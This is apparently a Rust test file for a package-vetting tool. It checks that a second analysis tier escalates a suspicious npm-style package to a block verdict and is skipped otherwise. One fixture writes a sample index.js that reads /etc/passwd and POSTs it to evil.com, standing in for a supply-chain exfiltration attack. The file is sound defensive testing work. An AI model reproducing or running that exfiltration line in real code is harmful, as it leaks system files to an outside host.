//! Tier 2 escalation: verify score_tarball_with_context runs manifest →
//! taint → correlation when the post-Tier-1 score is in the suspicion
//! window.

use std::fs;

use vetpkg::analysis::manifest::FileManifest;
use vetpkg::engine::suspicion_map::Tier0Result;
use vetpkg::engine::TierOrchestrator;
use vetpkg::platform::TempDir;
use vetpkg::signals::binary_blob::BlobInventory;
use vetpkg::signals::build_diff::BuildScriptCache;
use vetpkg::types::{PolicyConfig, Verdict};

fn write(root: &std::path::Path, rel: &str, content: &[u8]) {
    let p = root.join(rel);
    fs::create_dir_all(p.parent().unwrap()).unwrap();
    fs::write(&p, content).unwrap();
}

#[test]
fn tier2_escalates_nx_style_exfil_from_warn_to_block() {
    let td = TempDir::new("tier2-nx").unwrap();
    write(
        td.path(),
        "package/index.js",
        b"const envData = fs.readFileSync('/etc/passwd');\nfetch('https://evil.com/exfil', {method: 'POST', body: envData});\n",
    );
    write(td.path(), "package/package.json", b"{\"name\":\"nx-like\"}");

    let orch = TierOrchestrator::new(PolicyConfig::default());
    orch.suspicion.insert(
        "nx-like",
        "1.0.0",
        Tier0Result {
            score: 0.45,
            signals: vec![],
            cached_at: std::time::Instant::now(),
        },
    );

    let result = orch
        .score_tarball_with_context(
            "nx-like",
            "1.0.0",
            td.path(),
            &BlobInventory::default(),
            &BuildScriptCache::default(),
            &FileManifest::default(),
            &[],
            false,
        )
        .unwrap();

    assert!(
        result.tier2_score > 0.0,
        "expected tier2 activation, got {result:?}"
    );
    assert!(
        result.score >= 0.6,
        "expected Block tier, got {:.3} signals={:?}",
        result.score,
        result.signals
    );
    assert_eq!(result.verdict, Verdict::Block);
}

#[test]
fn tier2_does_not_run_when_already_blocked_at_tier1() {
    let td = TempDir::new("tier2-skip").unwrap();
    write(td.path(), "package/package.json", b"{\"name\":\"x\"}");

    let orch = TierOrchestrator::new(PolicyConfig::default());
    orch.suspicion.insert(
        "x",
        "1.0.0",
        Tier0Result {
            score: 0.7,
            signals: vec![],
            cached_at: std::time::Instant::now(),
        },
    );
    let result = orch
        .score_tarball_with_context(
            "x",
            "1.0.0",
            td.path(),
            &BlobInventory::default(),
            &BuildScriptCache::default(),
            &FileManifest::default(),
            &[],
            false,
        )
        .unwrap();
    assert_eq!(result.tier2_score, 0.0);
    assert!(result.score >= 0.6);
}

#[test]
fn tier2_does_not_run_when_allow_at_tier1() {
    let td = TempDir::new("tier2-allow").unwrap();
    write(
        td.path(),
        "package/index.js",
        b"export const add = (a, b) => a + b;\n",
    );

    let orch = TierOrchestrator::new(PolicyConfig::default());
    let result = orch
        .score_tarball_with_context(
            "clean-pkg",
            "1.0.0",
            td.path(),
            &BlobInventory::default(),
            &BuildScriptCache::default(),
            &FileManifest::default(),
            &[],
            false,
        )
        .unwrap();
    assert_eq!(result.tier2_score, 0.0);
    assert_eq!(result.verdict, Verdict::Allow);
}
